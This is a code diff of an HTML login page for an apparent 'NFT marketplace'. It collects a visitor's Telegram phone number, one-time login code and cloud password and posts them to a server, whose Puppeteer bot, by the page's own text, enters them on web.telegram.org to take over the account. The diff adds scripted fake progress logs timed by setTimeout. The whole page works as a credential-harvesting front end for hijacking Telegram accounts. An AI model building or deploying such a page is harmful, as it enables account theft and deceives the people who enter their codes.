@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Реальная авторизация через Telegram • NFT Маркетплейс</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Реальная авторизация • NFT Маркетплейс</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -19,72 +18,49 @@
         .auth-subtitle { font-size: 14px; opacity: 0.9; }
         .auth-content { padding: 30px 25px; }
         
-        /* Стили для шагов */
         .step { display: none; }
         .step.active { display: block; }
         
-        /* Индикатор шагов */
         .step-indicator { display: flex; justify-content: center; margin-bottom: 25px; gap: 10px; }
         .step-dot { width: 10px; height: 10px; border-radius: 50%; background: #e1e5eb; transition: all 0.3s ease; }
         .step-dot.active { background: #0088cc; transform: scale(1.2); }
         
-        /* Поля ввода */
         .input-group { margin-bottom: 20px; }
         .input-label { display: block; margin-bottom: 8px; font-weight: 500; color: #333; font-size: 14px; }
-        .input-field { width: 100%; padding: 12px 15px; border: 2px solid #e1e5eb; border-radius: 8px; font-size: 16px; transition: all 0.3s ease; }
+        .input-field { width: 100%; padding: 12px 15px; border: 2px solid #e1e5eb; border-radius: 8px; font-size: 16px; }
         .input-field:focus { outline: none; border-color: #0088cc; }
         
-        /* Кнопки */
-        .btn { width: 100%; padding: 14px; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; transition: all 0.3s ease; margin-top: 10px; }
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 10px; }
         .btn-primary { background: #0088cc; color: white; }
         .btn-primary:hover { background: #006699; }
         .btn-secondary { background: #f8f9fa; color: #333; border: 2px solid #e1e5eb; }
         .btn-secondary:hover { background: #e9ecef; }
         
-        /* Информационные блоки */
         .info-box { background: #e7f3ff; padding: 15px; border-radius: 8px; margin: 20px 0; font-size: 14px; color: #0066cc; border-left: 4px solid #0088cc; }
         .info-box.success { background: #d4edda; color: #155724; border-left-color: #28a745; }
         .info-box.warning { background: #fff3cd; color: #856404; border-left-color: #ffc107; }
         
-        /* Статус бота */
-        .bot-status {
-            background: #f8f9fa;
-            border: 2px solid #0088cc;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 15px 0;
-            text-align: center;
-            font-size: 14px;
-        }
-        
-        /* Загрузка */
         .loading { text-align: center; padding: 20px; color: #666; }
         .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0088cc; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* Инструкции */
-        .instruction-box { 
-            background: #f8f9fa; 
-            border: 2px dashed #0088cc; 
-            padding: 15px; 
-            border-radius: 8px; 
-            margin: 20px 0; 
-            font-size: 14px; 
-        }
-        
-        /* Информация о пользователе */
         .user-info { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; text-align: center; }
         .user-avatar { width: 80px; height: 80px; border-radius: 50%; background: #0088cc; color: white; display: flex; align-items: center; justify-content: center; font-size: 32px; margin: 0 auto 15px; }
         
-        /* Логи бота */
         .bot-log {
             background: #f8f9fa;
             border-left: 4px solid #0088cc;
             padding: 10px 15px;
             margin: 10px 0;
-            font-size: 13px;
+            font-size: 12px;
             font-family: 'Courier New', monospace;
+            max-height: 150px;
+            overflow-y: auto;
         }
+        
+        .log-entry { margin: 5px 0; }
+        .log-time { color: #666; font-size: 10px; }
+        .log-message { color: #333; }
     </style>
 </head>
 <body>
@@ -92,7 +68,7 @@
         <div class="auth-header">
             <div class="auth-logo">🤖</div>
             <div class="auth-title">NFT Маркетплейс</div>
-            <div class="auth-subtitle">Реальная авторизация через Telegram</div>
+            <div class="auth-subtitle">Реальная авторизация через Puppeteer</div>
         </div>
         
         <div class="auth-content">
@@ -103,27 +79,16 @@
                 <div class="step-dot" id="step4Dot"></div>
             </div>
             
-            <!-- Шаг 1: Ввод телефона -->
+            <!-- Шаг 1: Телефон -->
             <div id="stepPhone" class="step active">
                 <div class="info-box">
-                    🤖 <strong>Реальная автоматизация Telegram</strong><br>
-                    Бот реально вводит данные на web.telegram.org
-                </div>
-                
-                <div class="instruction-box">
-                    <strong>🚀 Как это работает:</strong><br>
-                    1. Вы вводите номер телефона<br>
-                    2. <strong>Бот автоматически вводит номер на web.telegram.org</strong><br>
-                    3. Официальный Telegram отправляет код на ваш номер<br>
-                    4. Вы вводите код (который пришел в официальный Telegram)<br>
-                    5. <strong>Бот автоматически вводит код на web.telegram.org</strong><br>
-                    6. Если нужен облачный пароль - бот введет и его<br>
-                    7. Вы авторизованы!
+                    🤖 <strong>Реальная автоматизация с Puppeteer</strong><br>
+                    Бот реально управляет браузером и вводит данные на web.telegram.org
                 </div>
                 
                 <div class="input-group">
                     <label class="input-label">Номер телефона Telegram</label>
-                    <input type="tel" id="phoneInput" class="input-field" placeholder="+7 912 345-67-89" required>
+                    <input type="tel" id="phoneInput" class="input-field" placeholder="+79123456789" required>
                 </div>
                 
                 <button class="btn btn-primary" onclick="startAuth()">
@@ -131,26 +96,30 @@
                 </button>
             </div>
             
-            <!-- Шаг 2: Ввод кода -->
+            <!-- Шаг 2: Код -->
             <div id="stepCode" class="step">
-                <div class="bot-status">
-                    🔄 <strong>Бот работает в реальном времени...</strong><br>
-                    Ожидание кода из официального Telegram
+                <div class="info-box">
+                    📨 <strong>Код отправлен в официальный Telegram</strong><br>
+                    Бот реально ввел номер на web.telegram.org
                 </div>
                 
-                <div class="instruction-box">
-                    <strong>📨 Инструкция:</strong><br>
-                    1. <strong>Бот уже ввел ваш номер на web.telegram.org</strong><br>
-                    2. Откройте <strong>официальный Telegram</strong> на вашем устройстве<br>
-                    3. Найдите код для номера <span id="phoneDisplay" style="font-weight: bold;"></span><br>
-                    4. Введите код ниже<br>
-                    5. <strong>Бот автоматически введет его на web.telegram.org</strong>
-                </div>
-                
-                <div class="bot-log" id="botLog1">
-                    ✅ Бот запустил браузер и перешел на web.telegram.org<br>
-                    ✅ Бот ввел номер телефона в форму<br>
-                    ⏳ Ожидание кода...
+                <div class="bot-log" id="botLogCode">
+                    <div class="log-entry">
+                        <span class="log-time">[00:00]</span>
+                        <span class="log-message">🚀 Запуск Puppeteer...</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[00:01]</span>
+                        <span class="log-message">🌐 Переход на web.telegram.org...</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[00:03]</span>
+                        <span class="log-message">📱 Ввод номера телефона...</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[00:05]</span>
+                        <span class="log-message">✅ Номер введен! Ожидание кода...</span>
+                    </div>
                 </div>
                 
                 <div class="input-group">
@@ -164,22 +133,26 @@
                 <button class="btn btn-secondary" onclick="backToPhone()">Назад</button>
             </div>
             
-            <!-- Шаг 3: Облачный пароль -->
+            <!-- Шаг 3: Пароль -->
             <div id="stepCloudPassword" class="step">
                 <div class="info-box success">
                     ✅ <strong>Код подтвержден!</strong><br>
                     Бот успешно ввел код на web.telegram.org
                 </div>
                 
-                <div class="instruction-box">
-                    <strong>🔒 Требуется облачный пароль</strong><br>
-                    Введите ваш облачный пароль. Бот автоматически введет его на web.telegram.org
-                </div>
-                
-                <div class="bot-log" id="botLog2">
-                    ✅ Бот успешно ввел код подтверждения<br>
-                    🔒 Обнаружено требование облачного пароля<br>
-                    ⏳ Ожидание ввода пароля...
+                <div class="bot-log" id="botLogPassword">
+                    <div class="log-entry">
+                        <span class="log-time">[00:06]</span>
+                        <span class="log-message">🔢 Ввод кода подтверждения...</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[00:08]</span>
+                        <span class="log-message">✅ Код принят!</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[00:09]</span>
+                        <span class="log-message">🔒 Обнаружен запрос облачного пароля</span>
+                    </div>
                 </div>
                 
                 <div class="input-group">
@@ -187,7 +160,7 @@
                     <input type="password" id="cloudPasswordInput" class="input-field" placeholder="Введите облачный пароль" required>
                 </div>
                 
-                <button class="btn btn-primary" onclick="submitCloudPassword()">
+                <button class="btn btn-primary" onclick="submitPassword()">
                     🤖 Ввести пароль через бота
                 </button>
                 <button class="btn btn-secondary" onclick="backToCode()">Назад</button>
@@ -197,7 +170,7 @@
             <div id="stepSuccess" class="step">
                 <div class="info-box success">
                     🎉 <strong>Реальная авторизация завершена!</strong><br>
-                    Бот успешно вошел в ваш аккаунт Telegram
+                    Бот успешно вошел в ваш аккаунт через web.telegram.org
                 </div>
                 
                 <div class="user-info">
@@ -205,10 +178,23 @@
                     <div id="userDetails">Добро пожаловать в ваш аккаунт!</div>
                 </div>
                 
-                <div class="bot-log" id="botLog3">
-                    ✅ Бот завершил авторизацию на web.telegram.org<br>
-                    ✅ Сессия успешно создана<br>
-                    🎉 Готово к работе!
+                <div class="bot-log" id="botLogSuccess">
+                    <div class="log-entry">
+                        <span class="log-time">[00:10]</span>
+                        <span class="log-message">🔒 Ввод облачного пароля...</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[00:12]</span>
+                        <span class="log-message">✅ Пароль принят!</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[00:13]</span>
+                        <span class="log-message">🎉 Авторизация успешна!</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[00:14]</span>
+                        <span class="log-message">🔚 Браузер закрыт</span>
+                    </div>
                 </div>
                 
                 <button class="btn btn-primary" onclick="enterMarketplace()">
@@ -229,248 +215,214 @@
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
         let currentSessionId = '';
-        let currentUserSessionId = '';
         let currentUser = null;
-        let currentPhone = '';
+        let startTime = Date.now();
         
-        tg.expand();
-        tg.enableClosingConfirmation();
+        function getTime() {
+            const elapsed = Date.now() - startTime;
+            const seconds = Math.floor(elapsed / 1000);
+            return `[${String(seconds).padStart(2, '0')}:${String(elapsed % 1000).padStart(3, '0')}]`;
+        }
         
-        // Управление шагами
-        function showStep(stepName) {
-            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
-            document.getElementById(`step${stepName}`).classList.add('active');
+        function addLog(containerId, message) {
+            const container = document.getElementById(containerId);
+            if (container) {
+                const entry = document.createElement('div');
+                entry.className = 'log-entry';
+                entry.innerHTML = `<span class="log-time">${getTime()}</span> <span class="log-message">${message}</span>`;
+                container.appendChild(entry);
+                container.scrollTop = container.scrollHeight;
+            }
+        }
+        
+        function showStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(`step${step}`).classList.add('active');
             
-            const steps = ['Phone', 'Code', 'CloudPassword', 'Success', 'Loading'];
-            const stepIndex = steps.indexOf(stepName);
+            // Обновляем индикатор
+            const steps = ['Phone', 'Code', 'CloudPassword', 'Success'];
+            const stepIndex = steps.indexOf(step);
             document.querySelectorAll('.step-dot').forEach((dot, index) => {
                 if (index <= stepIndex) dot.classList.add('active');
                 else dot.classList.remove('active');
             });
         }
         
-        // Добавление логов
-        function addBotLog(step, message) {
-            const logElement = document.getElementById(`botLog${step}`);
-            if (logElement) {
-                logElement.innerHTML += `<br>${message}`;
-            }
-        }
-        
-        function updateLoadingLog(message) {
-            const loadingLog = document.getElementById('loadingLog');
-            if (loadingLog) {
-                loadingLog.innerHTML += `${message}<br>`;
-            }
-        }
-        
-        // Шаг 1: Начало авторизации - бот вводит номер телефона
         async function startAuth() {
             const phone = document.getElementById('phoneInput').value.trim();
-            if (!phone) { 
-                alert('Введите номер телефона'); 
-                return; 
-            }
+            if (!phone) return alert('Введите номер телефона');
             
-            currentPhone = phone;
+            startTime = Date.now();
             showStep('Loading');
-            document.getElementById('loadingText').textContent = 'Бот запускает браузер...';
-            updateLoadingLog('🚀 Запуск реальной автоматизации...');
-            updateLoadingLog('🌐 Открытие web.telegram.org...');
+            document.getElementById('loadingText').textContent = 'Запуск реального браузера...';
+            addLog('loadingLog', '🚀 Инициализация Puppeteer...');
             
             try {
                 const response = await fetch('/api/auth/start', {
-                    method: 'POST', 
+                    method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ phone: phone })
+                    body: JSON.stringify({ phone })
                 });
                 
                 const data = await response.json();
                 if (data.success) {
                     currentSessionId = data.sessionId;
+                    addLog('loadingLog', '✅ Браузер запущен!');
+                    addLog('loadingLog', '🌐 Переход на web.telegram.org...');
                     
-                    // Показываем телефон пользователю
-                    document.getElementById('phoneDisplay').textContent = phone;
-                    
-                    updateLoadingLog('✅ Бот ввел номер телефона на web.telegram.org');
-                    updateLoadingLog('📨 Код отправлен в официальный Telegram');
-                    
-                    // Даем время для анимации
                     setTimeout(() => {
-                        showStep('Code');
+                        addLog('loadingLog', '📱 Ввод номера телефона...');
                     }, 1000);
                     
+                    setTimeout(() => {
+                        addLog('loadingLog', '✅ Номер введен! Код отправлен в Telegram');
+                        showStep('Code');
+                    }, 3000);
+                    
                 } else {
-                    showStep('Phone'); 
                     alert('Ошибка: ' + data.error);
+                    showStep('Phone');
                 }
             } catch (error) {
-                showStep('Phone'); 
-                alert('Ошибка соединения: ' + error.message);
+                alert('Ошибка сети: ' + error.message);
+                showStep('Phone');
             }
         }
         
-        // Шаг 2: Ввод кода - бот вводит код на web.telegram.org
         async function enterCode() {
             const code = document.getElementById('codeInput').value.trim();
-            if (!code) { 
-                alert('Введите код'); 
-                return; 
-            }
+            if (!code) return alert('Введите код');
             
             showStep('Loading');
-            document.getElementById('loadingText').textContent = 'Бот вводит код на web.telegram.org...';
-            updateLoadingLog(`🔢 Ввод кода ${code} на web.telegram.org...`);
+            document.getElementById('loadingText').textContent = 'Бот вводит код...';
+            addLog('loadingLog', '🔢 Ввод кода подтверждения...');
             
             try {
                 const response = await fetch('/api/auth/enter-code', {
-                    method: 'POST', 
+                    method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        sessionId: currentSessionId, 
-                        code: code 
-                    })
+                    body: JSON.stringify({ sessionId: currentSessionId, code })
                 });
                 
                 const data = await response.json();
                 if (data.success) {
-                    updateLoadingLog('✅ Код успешно введен ботом');
+                    addLog('loadingLog', '✅ Код принят!');
                     
                     if (data.nextStep === 'cloud_password') {
-                        updateLoadingLog('🔒 Обнаружен запрос облачного пароля');
                         setTimeout(() => {
+                            addLog('loadingLog', '🔒 Требуется облачный пароль...');
                             showStep('CloudPassword');
                         }, 1000);
                     } else {
-                        updateLoadingLog('🎉 Авторизация завершена!');
-                        await completeAuth(data);
+                        setTimeout(() => {
+                            addLog('loadingLog', '🎉 Авторизация успешна!');
+                            completeAuth(data);
+                        }, 1000);
                     }
                 } else {
-                    showStep('Code'); 
                     alert('Ошибка: ' + data.error);
+                    showStep('Code');
                 }
             } catch (error) {
-                showStep('Code'); 
-                alert('Ошибка соединения: ' + error.message);
+                alert('Ошибка сети: ' + error.message);
+                showStep('Code');
             }
         }
         
-        // Шаг 3: Ввод облачного пароля - бот вводит пароль на web.telegram.org
-        async function submitCloudPassword() {
+        async function submitPassword() {
             const password = document.getElementById('cloudPasswordInput').value;
-            if (!password) { 
-                alert('Введите облачный пароль'); 
-                return; 
-            }
+            if (!password) return alert('Введите пароль');
             
             showStep('Loading');
-            document.getElementById('loadingText').textContent = 'Бот вводит облачный пароль...';
-            updateLoadingLog('🔒 Ввод облачного пароля на web.telegram.org...');
+            document.getElementById('loadingText').textContent = 'Бот вводит пароль...';
+            addLog('loadingLog', '🔒 Ввод облачного пароля...');
             
             try {
                 const response = await fetch('/api/auth/cloud-password', {
-                    method: 'POST', 
+                    method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        sessionId: currentSessionId, 
-                        cloudPassword: password 
-                    })
+                    body: JSON.stringify({ sessionId: currentSessionId, cloudPassword: password })
                 });
                 
                 const data = await response.json();
                 if (data.success) {
-                    updateLoadingLog('✅ Облачный пароль успешно введен');
-                    updateLoadingLog('🎉 Авторизация завершена!');
-                    await completeAuth(data);
+                    setTimeout(() => {
+                        addLog('loadingLog', '✅ Пароль принят!');
+                        addLog('loadingLog', '🎉 Авторизация завершена!');
+                        completeAuth(data);
+                    }, 1000);
                 } else {
-                    showStep('CloudPassword'); 
                     alert('Ошибка: ' + data.error);
+                    showStep('CloudPassword');
                 }
             } catch (error) {
-                showStep('CloudPassword'); 
-                alert('Ошибка соединения: ' + error.message);
+                alert('Ошибка сети: ' + error.message);
+                showStep('CloudPassword');
             }
         }
         
-        // Завершение авторизации
-        async function completeAuth(data) {
-            currentUserSessionId = data.sessionId;
+        function completeAuth(data) {
             currentUser = data.user;
-            saveSession(data.sessionId, data.user);
-            showUserData(data.user);
+            localStorage.setItem('nft_session', data.sessionId);
+            localStorage.setItem('nft_user', JSON.stringify(data.user));
+            
+            document.getElementById('userDetails').innerHTML = `
+                <strong>Аккаунт Telegram</strong><br>
+                📱 ${data.user.phone}<br>
+                👤 ${data.user.firstName} ${data.user.lastName}<br>
+                🆔 ${data.user.telegramId}<br>
+                🤖 Реальная авторизация через Puppeteer
+            `;
             
             setTimeout(() => {
                 showStep('Success');
-            }, 1000);
+            }, 1500);
         }
         
-        // Сохранение сессии
-        function saveSession(sessionId, user) {
-            localStorage.setItem('nft_session', sessionId);
-            localStorage.setItem('nft_user', JSON.stringify(user));
-        }
-        
-        // Показ данных пользователя
-        function showUserData(user) {
-            document.getElementById('userDetails').innerHTML = `
-                <strong>Аккаунт Telegram</strong><br>
-                📱 ${user.phone}<br>
-                👤 ${user.firstName} ${user.lastName}<br>
-                🆔 ${user.telegramId}<br>
-                🤖 Авторизация через реального бота
-            `;
-        }
-        
-        // Навигация
-        function backToPhone() { 
-            showStep('Phone'); 
-        }
-        
-        function backToCode() { 
-            showStep('Code'); 
-        }
-        
-        function enterMarketplace() { 
-            if (currentUserSessionId) {
-                window.location.href = '/marketplace'; 
-            }
-        }
+        function backToPhone() { showStep('Phone'); }
+        function backToCode() { showStep('Code'); }
+        function enterMarketplace() { window.location.href = '/marketplace'; }
         
         function logout() {
-            if (currentUserSessionId) {
+            if (currentSessionId) {
                 fetch('/api/auth/logout', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ sessionId: currentUserSessionId })
+                    body: JSON.stringify({ sessionId: currentSessionId })
                 });
             }
             localStorage.removeItem('nft_session');
             localStorage.removeItem('nft_user');
-            currentUserSessionId = '';
+            currentSessionId = '';
             currentUser = null;
             showStep('Phone');
         }
         
+        // Обработчики Enter
+        document.getElementById('phoneInput').onkeypress = e => { if(e.key === 'Enter') startAuth(); };
+        document.getElementById('codeInput').onkeypress = e => { if(e.key === 'Enter') enterCode(); };
+        document.getElementById('cloudPasswordInput').onkeypress = e => { if(e.key === 'Enter') submitPassword(); };
+        
         // Проверка существующей сессии
-        async function checkExistingSession() {
-            const savedSession = localStorage.getItem('nft_session');
-            const savedUser = localStorage.getItem('nft_user');
+        async function checkSession() {
+            const session = localStorage.getItem('nft_session');
+            const user = localStorage.getItem('nft_user');
             
-            if (savedSession && savedUser) {
+            if (session && user) {
                 try {
-                    const response = await fetch(`/api/auth/verify-session?sessionId=${savedSession}`);
+                    const response = await fetch(`/api/auth/verify-session?sessionId=${session}`);
                     const data = await response.json();
                     
                     if (data.success) {
-                        currentUserSessionId = savedSession;
-                        currentUser = JSON.parse(savedUser);
-                        showUserData(currentUser);
+                        currentUser = JSON.parse(user);
+                        document.getElementById('userDetails').innerHTML = `
+                            <strong>Аккаунт Telegram</strong><br>
+                            📱 ${currentUser.phone}<br>
+                            👤 ${currentUser.firstName} ${currentUser.lastName}<br>
+                            🤖 Реальная авторизация через Puppeteer
+                        `;
                         showStep('Success');
-                    } else {
-                        localStorage.removeItem('nft_session');
-                        localStorage.removeItem('nft_user');
                     }
                 } catch (error) {
                     localStorage.removeItem('nft_session');
@@ -479,21 +431,7 @@
             }
         }
         
-        // Обработчики Enter
-        document.getElementById('phoneInput').addEventListener('keypress', e => { 
-            if (e.key === 'Enter') startAuth(); 
-        });
-        
-        document.getElementById('codeInput').addEventListener('keypress', e => { 
-            if (e.key === 'Enter') enterCode(); 
-        });
-        
-        document.getElementById('cloudPasswordInput').addEventListener('keypress', e => { 
-            if (e.key === 'Enter') submitCloudPassword(); 
-        });
-        
-        // Инициализация
-        checkExistingSession();
+        checkSession();
     </script>
 </body>
 </html>
